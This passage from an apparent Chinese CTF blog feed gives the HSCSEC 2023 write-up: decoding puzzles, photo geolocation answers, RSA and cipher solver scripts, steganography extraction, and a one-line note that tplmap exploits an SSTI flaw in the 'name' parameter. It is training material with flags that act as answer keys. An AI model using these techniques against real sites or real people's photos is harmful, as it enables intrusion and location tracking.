的位置。这给了我们链接<br><code>[https://discordapp.com/api/servers/1060030874722259057/widget.json](https://discordapp.com/api/servers/1060030874722259057/widget.json)</code><br><img src="/mdimg/lactf/42.png"><br>打开之后发现是个邀请链接，打开之后进入LA CTF-Chall Server 5服务器，就可以看到flag了<br><img src="/mdimg/lactf/43.png"><br><img src="/mdimg/lactf/44.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HSCSEC 2023-wp</title>
    <link href="/2023/02/13/HSCSEC%202023-wp/"/>
    <url>/2023/02/13/HSCSEC%202023-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="本次比赛所有附件，关注微信公众号：Hor1zon-回复HSCSEC-获取"><a href="#本次比赛所有附件，关注微信公众号：Hor1zon-回复HSCSEC-获取" class="headerlink" title="本次比赛所有附件，关注微信公众号：Hor1zon 回复HSCSEC 获取"></a><strong>本次比赛所有附件，关注微信公众号：Hor1zon 回复HSCSEC 获取</strong></h1><h1 id="Ancient-MISC"><a href="#Ancient-MISC" class="headerlink" title="Ancient-MISC"></a>Ancient-MISC</h1><h3 id="Watch-the-sky-at-night"><a href="#Watch-the-sky-at-night" class="headerlink" title="Watch the sky at night"></a>Watch the sky at night</h3><p>24星宿<br><code>斗木獬角木蛟奎木狼亢金龙 牛金牛女土蝠氐土貉井木犴 虚日鼠房日兔心月狐鬼金羊 危月燕室火猪尾火虎柳土獐 壁水貐箕水豹斗木獬牛金牛 女土蝠角木蛟亢金龙星日马 虚日鼠张月鹿娄金狗翼火蛇 危月燕氐土貉房日兔轸水蚓 室火猪心月狐井木犴胃土雉 壁水貐斗木獬鬼金羊柳土獐 牛金牛尾火虎箕水豹女土蝠 虚日鼠昴日鸡柳土獐毕月乌 危月燕觜火猴角木蛟星日马 室火猪参水猿奎木狼壁水貐 斗木獬娄金狗牛金牛女土蝠 虚日鼠胃土雉张月鹿昴日鸡 危月燕翼火蛇室火猪亢金龙 壁水貐斗木獬轸水蚓井木犴 牛金牛氐土貉房日兔女土蝠 虚日鼠危月燕心月狐尾火虎 室火猪鬼金羊柳土獐壁水貐</code><br><img src="/mdimg/hscsec/1.png"><br>东北西南依次对应0123，4进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">m = <span class="hljs-string">&quot;&quot;</span><br>text =<span class="hljs-string">&quot;1020,1103,1003,1103,1011,1003,1323,1003,1032,1133,1001,1232,1203,1221,1211,1232,1310,1133,1001,1100,1331&quot;</span><br><br>c=text.split(<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>        temp = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(i)):<br>            temp += <span class="hljs-built_in">int</span>(i[j]) * (<span class="hljs-number">4</span> ** (<span class="hljs-built_in">len</span>(i) - j -<span class="hljs-number">1</span>))<br>        m += <span class="hljs-built_in">chr</span>(temp)<br><span class="hljs-built_in">print</span> (m)<br><span class="hljs-comment">#HSCSEC&#123;CN_Ancient_AP&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Deduced-gossip"><a href="#Deduced-gossip" class="headerlink" title="Deduced gossip"></a>Deduced gossip</h3><p>盗墓笔记看多了，了解一点，一眼八卦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲<br></code></pre></td></tr></table></figure><p>八卦有八个卦象，还有一个空字，猜测9进制<br>猜格式是HSCSEC{}<br>前7个对应9进制<code>80,102,74,102,76,74,146</code>，最后一个是<code>148</code><br>则还剩下3，5没有对应，尝试两次就行<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">dict1 = &#123;<span class="hljs-string">&#x27;☵&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;☷&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;☳&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;☴&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;空&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br>        <span class="hljs-string">&#x27;☰&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;☱&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;☶&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;☲&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>&#125;<br>dict2=&#123;<span class="hljs-string">&#x27;☵&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;☷&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;☳&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;☰&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;空&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br>        <span class="hljs-string">&#x27;☴&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;☱&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;☶&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;☲&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>&#125;<br>c= <span class="hljs-string">&#x27;☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲&#x27;</span><br>flag1=<span class="hljs-string">&#x27;&#x27;</span><br>flag2= <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#表1</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> x==<span class="hljs-string">&#x27; &#x27;</span>:<br>        flag1 +=<span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">continue</span><br>    flag1 +=  dict1.get(x)<br><span class="hljs-comment">#表2</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> x==<span class="hljs-string">&#x27; &#x27;</span>:<br>        flag2 +=<span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">continue</span><br>    flag2+=  dict2.get(x)<br><span class="hljs-built_in">print</span>(flag1)<br><span class="hljs-built_in">print</span>(flag2)<br><span class="hljs-comment">#80 102 74 102 76 74 146 74 125 126 132 122 137 122 115 124 53 137 137 134 148</span><br><span class="hljs-comment">#80 102 74 102 76 74 146 74 123 126 152 122 157 122 113 124 35 157 157 154 148</span><br></code></pre></td></tr></table></figure><p>然后在线转换器转一下发现表1是对的<br><code>HSCSEC&#123;Chinese_g0ssip&#125;</code></p><h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h3 id="Happy-Lantern-Festival"><a href="#Happy-Lantern-Festival" class="headerlink" title="Happy Lantern Festival"></a>Happy Lantern Festival</h3><p>说明：<code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天河市天河路天河步行街&#125;</code><br><img src="/mdimg/hscsec/2.png"><br>图片信息：<code>阿勒泰市第13届元宵灯会</code><br><img src="/mdimg/hscsec/3.png"><br><img src="/mdimg/hscsec/4.png"><br><code>HSCSEC&#123;新疆维吾尔自治区阿勒泰地区阿勒泰市五百里风情街&#125;</code></p><h3 id="Boat"><a href="#Boat" class="headerlink" title="Boat"></a>Boat</h3><p>说明：<code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;具体地址&#125;</code><br><img src="/mdimg/hscsec/5.png"><br>百度识图第一张就是<br><img src="/mdimg/hscsec/6.png"><br>地图搜西湖<br><img src="/mdimg/hscsec/7.png"><br><code>HSCSEC&#123;浙江省杭州市西湖区龙井路1号&#125;</code></p><h3 id="Cable-car"><a href="#Cable-car" class="headerlink" title="Cable car"></a>Cable car</h3><p><img src="/mdimg/hscsec/8.png"><br>一眼重庆<br><img src="/mdimg/hscsec/9.png"><br><img src="/mdimg/hscsec/10.png"><br>根据图片基本可以判断一个区域<br><img src="/mdimg/hscsec/11.png"><br>看图片是一个靠近江边的地方<br>搜山什集找到类似的图片<br><img src="/mdimg/hscsec/12.png"><br><code>HSCSEC&#123;重庆市渝中区白象居4号楼9-1号&#125;</code></p><h3 id="Romantic-firework"><a href="#Romantic-firework" class="headerlink" title="Romantic firework"></a>Romantic firework</h3><p><img src="/mdimg/hscsec/13.png"><br><img src="/mdimg/hscsec/14.png"><br>甘肃消防<br><img src="/mdimg/hscsec/15.png"><br>图上建筑吻合<br><a href="https://cul.sohu.com/a/635448600_120801">https://cul.sohu.com/a/635448600_120801</a><img src="/mdimg/hscsec/16.png"><br>地图上找位置<br><code>HSCSEC&#123;甘肃省白银市白银区金岭公园&#125;</code></p><h3 id="Airplane"><a href="#Airplane" class="headerlink" title="Airplane"></a>Airplane</h3><p><img src="/mdimg/hscsec/17.png"><br>一直分析飞机无果<br>重庆航空，飞机注册号B-30EL<br><img src="/mdimg/hscsec/18.png"><br>然查找B-30EL发现：<a href="https://www.jiemian.com/article/5391407.html">https://www.jiemian.com/article/5391407.html</a><br><img src="/mdimg/hscsec/19.png"><br><img src="/mdimg/hscsec/20.png"><br>大兴机场的鸟瞰图<br>对比吻合<br> <code>HSCSEC&#123; 北京市大兴区大兴国际机场&#125;</code></p><h3 id="Beautiful-Lake"><a href="#Beautiful-Lake" class="headerlink" title="Beautiful Lake"></a>Beautiful Lake</h3><p><code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天湖&#125;</code><br>看图片左侧<br><img src="/mdimg/hscsec/21.png"><br>宁夏理工学院<br><img src="/mdimg/hscsec/22.png"><br><img src="/mdimg/hscsec/23.png"><br><code>HSCSEC&#123;宁夏回族自治区石嘴山市大武口区星海湖&#125;</code></p><h3 id="Beautiful-Park"><a href="#Beautiful-Park" class="headerlink" title="Beautiful Park"></a>Beautiful Park</h3><p><code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天河国家湿地公园&#125;</code><br><img src="/mdimg/hscsec/24.png"><br><img src="/mdimg/hscsec/25.png"><br>地图搜<br><code>HSCSEC&#123;**河北省张家口市怀来县官厅水库国家湿地公园&#125;**</code></p><h3 id="Apple-Store"><a href="#Apple-Store" class="headerlink" title="Apple Store"></a>Apple Store</h3><p><code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天河路1号&#125; 例如：HSCSEC&#123;广东省广州市天河区天河路1号环贸F1&#125;</code><br><img src="/mdimg/hscsec/26.png"><br>百度地图：苹果西单大悦城店<br><img src="/mdimg/hscsec/27.png"><br><code>HSCSEC&#123;北京市西城区西单北大街131号&#125;</code></p><h3 id="Tower"><a href="#Tower" class="headerlink" title="Tower"></a>Tower</h3><p>澳门巴黎铁塔附近<br>全景地图<br><img src="/mdimg/hscsec/28.png"><br>看图片应该是在楼梯这个位置拍的<br><code> HSCSEC&#123;澳门特别行政区路氹填海区澳门路氹金光大道连贯公路澳门巴黎人&#125;</code></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h3 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python3</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><br>FLAG = <span class="hljs-string">&quot;*******************MASK****************&quot;</span><br><br><span class="hljs-comment"># print(FLAG)</span><br>number1 = getPrime(<span class="hljs-number">512</span>)<br>number2 = getPrime(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(number1)<br>result = FLAG * number1 % number2<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Output:</span><br><span class="hljs-string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span><br><span class="hljs-string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>显然number2远远大于number1，且flag就30位左右，所以<code>FLAG * number1 mod number2</code> 其实就等于<code>FLAG * number1</code><br>直接<code>FLAG =result// number1</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>number1=<span class="hljs-number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span><br>result=<span class="hljs-number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span><br>flag=result//number1<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;HSCSEC&#x27;</span>+<span class="hljs-built_in">str</span>(long_to_bytes(flag))[<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#HSCSEC&#123;qMmZqWvmj70bBsCfmVLT&#125;</span><br></code></pre></td></tr></table></figure><h3 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> m<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>,n)<br>e = <span class="hljs-number">0x10001</span><br>M = m * e * <span class="hljs-number">1</span> * <span class="hljs-number">2022</span> * p<br>c = <span class="hljs-built_in">pow</span>(M,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>,c)<br><br><span class="hljs-comment"># n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span><br><span class="hljs-comment"># c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">M = m * e * <span class="hljs-number">1</span> * <span class="hljs-number">2022</span> * p<br>c = <span class="hljs-built_in">pow</span>(M,e,n)<br></code></pre></td></tr></table></figure><p>这里猜测可以公约数求p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span><br>c = <span class="hljs-number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span><br>e = <span class="hljs-number">0x10001</span><br>x=(c*gmpy2.invert(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2022</span>,e,n),n)*gmpy2.invert(<span class="hljs-built_in">pow</span>(e,e,n),n))%n<br><span class="hljs-comment">#通过乘逆元然后求p，然后解RSA解出M</span><br>p=gmpy2.gcd(x,n)<br>q=n//p<br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>M=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-comment">#然后接着还原flag</span><br>m=M//e//<span class="hljs-number">2022</span>//p<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;HSCSEC&#x27;</span>+<span class="hljs-built_in">str</span>(long_to_bytes(m))[<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#HSCSEC&#123;3e5e2789a93a80615cc35edbff397c05&#125;</span><br></code></pre></td></tr></table></figure><h3 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> flag<br>alphabet = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span><br>key = <span class="hljs-string">&#x27;HSC&#x27;</span><br><span class="hljs-keyword">assert</span> flag.startswith(<span class="hljs-string">&#x27;HSCSEC&#123;&#x27;</span>)<br>flag_num_list = []<br>c = []<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> flag:<br>    flag_num_list.append(alphabet.find(item) + <span class="hljs-number">1</span>)<br>key_num = alphabet.find(key) + <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_num_list:<br>    m = (i + key_num) % <span class="hljs-number">94</span> - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> m == <span class="hljs-number">0</span>:<br>        c.append(<span class="hljs-string">&quot;□&quot;</span>)<br>    c.append(alphabet[m-<span class="hljs-number">1</span>:m])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(c)))<br><br><span class="hljs-comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span><br></code></pre></td></tr></table></figure><p>逆推一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">alphabet = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span><br>key = <span class="hljs-string">&#x27;HSC&#x27;</span><br>c = <span class="hljs-string">&quot;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>key_num = alphabet.find(key) + <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;□&quot;</span>:<br>        m = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        m = alphabet.find(i) + <span class="hljs-number">1</span><br>    flag_num = (m - key_num) % <span class="hljs-number">94</span> + <span class="hljs-number">1</span><br>    flag += alphabet[flag_num-<span class="hljs-number">1</span>:flag_num]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br><span class="hljs-comment">#flag = HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125;</span><br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="EZIMG"><a href="#EZIMG" class="headerlink" title="EZIMG"></a>EZIMG</h3><p><img src="/mdimg/hscsec/29.png"><br>010打开发现末尾有反过来的png<br>工具： <a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a><br>逆序一下<code>python3 FileReverse-Tools.py -i desktop.png</code><br><img src="/mdimg/hscsec/30.png"><br><code>HSCSEC&#123;p3g_h</code><br><img src="/mdimg/hscsec/31.png"><br>在文件尾后发现01数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>MAX = <span class="hljs-number">25</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;0000000001001011000000000000000000011111100000000000000000111010110000000000000000001110000000000000000000000010001100000000000000000010001011000000000000000010101010100000000000000001110110100000000011101111101110001110001001100010100110110100001011111010100100110001000111100100000100101001011000101100111100001101011110010010101001001001111100001110100110110100100011110110110110100001001101101011101001111010100011111101100000000101010011000110110000000010001101101010011000000001111111010001101100000000101100101111110010000000001000011010001100000000001010001111011000100000000111000111100000100000000011101101101010011&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>转换为二维码<br><img src="/mdimg/hscsec/32.png"><br>加定点<br><img src="/mdimg/hscsec/33.png"><br><img src="/mdimg/hscsec/34.png"><br><code>flag2:aQR_c0de_and   </code><br><a href="https://www.wotianna.com/pixels/">https://www.wotianna.com/pixels/</a><br><img src="/mdimg/hscsec/35.png"><br><code>_3nc&#125; </code><br>综上所述：<code>HSCSEC&#123;p3G_haQR_c0de_and_3nc&#125;</code></p><h3 id="Salute"><a href="#Salute" class="headerlink" title="Salute"></a>Salute</h3><p><img src="/mdimg/hscsec/36.png"><br>末尾有一段MD5<br><code>5d93ceb70e2bf5daa84ec3d0cd2c731a</code><br><img src="/mdimg/hscsec/37.png"><br><code>qwer1234</code><br>文件异或qwer1234<br><img src="/mdimg/hscsec/38.png"><br>得到压缩包<br><img src="/mdimg/hscsec/39.png"><br>对png<br><img src="/mdimg/hscsec/40.png"><br><code>flag2/key that_is</code>意思是flag2和KEY都是that_is，那么前面解出来的那串应该就是flag1了<br>steghide分离<br><code>steghide extract -sf /home/kali/桌面/salute.jpg -p that_is</code><br><img src="/mdimg/hscsec/41.png"><br><img src="/mdimg/hscsec/42.png"><br><code>flag3:_c0ol&#125;</code><br>综上所述：<code>HSCSEC&#123;qwer1234that_is_c0ol&#125;</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h3><p>tplmap 一把梭<br>注入点是name<br><img src="/mdimg/hscsec/43.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Byte Bandits CTF 2023</title>
    <link href="/2023/02/10/Byte%20Bandits%20CTF%202023/"/>
    <url>/2023/02/10/Byte%20Bandits%20CTF%202023/</url>
    
